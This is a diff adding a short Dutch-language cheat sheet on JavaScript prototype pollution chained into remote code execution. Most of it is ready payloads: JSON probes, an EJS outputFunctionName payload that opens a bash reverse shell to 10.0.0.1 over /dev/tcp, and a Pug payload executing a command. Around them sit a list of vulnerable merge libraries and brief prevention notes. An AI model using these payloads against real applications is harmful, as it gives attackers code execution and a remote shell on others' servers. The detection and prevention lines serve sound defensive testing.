@@ -1,0 +1,26 @@
+# JavaScript Prototype Pollution -> RCE
+# === Detectie (blackbox) ===
+# JSON input met __proto__:
+{"__proto__":{"polluted":"yes"}}
+{"constructor":{"prototype":{"polluted":"yes"}}}
+# Check: als {}.polluted === "yes" -> kwetsbaar
+# Crash test: {"__proto__":{"toString":"crash"}}
+# === RCE via EJS template engine ===
+# Pollute outputFunctionName:
+{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.0.0.1/443 0>&1\"');x"}}
+# === RCE via Pug template engine ===
+# Pollute block:
+{"__proto__":{"block":{"type":"Text","val":"x]];process.mainModule.require('child_process').exec('id');//"}}}
+# === RCE via Handlebars ===
+# Pollute pendingContent met shell payload
+# Complexere chain via compiler internals
+# === Kwetsbare libraries (deep merge/extend) ===
+# deep-extend, lodash.merge (< 4.6.2), jQuery.extend (deep=true)
+# Hoistjs, deeps, defaults-deep, assign-deep
+# === Detectie in source code ===
+# Zoek naar: merge(target, source), extend(true, target, source)
+# Object.assign werkt NIET (shallow copy, geen prototype pollution)
+# === Preventie check ===
+# Veilig: Object.create(null), Map, hasOwnProperty check
+# Tip: Combineer met template engine voor RCE chain
+# Tip: WebSocket parameters zijn vaak kwetsbaar (minder sanitization)
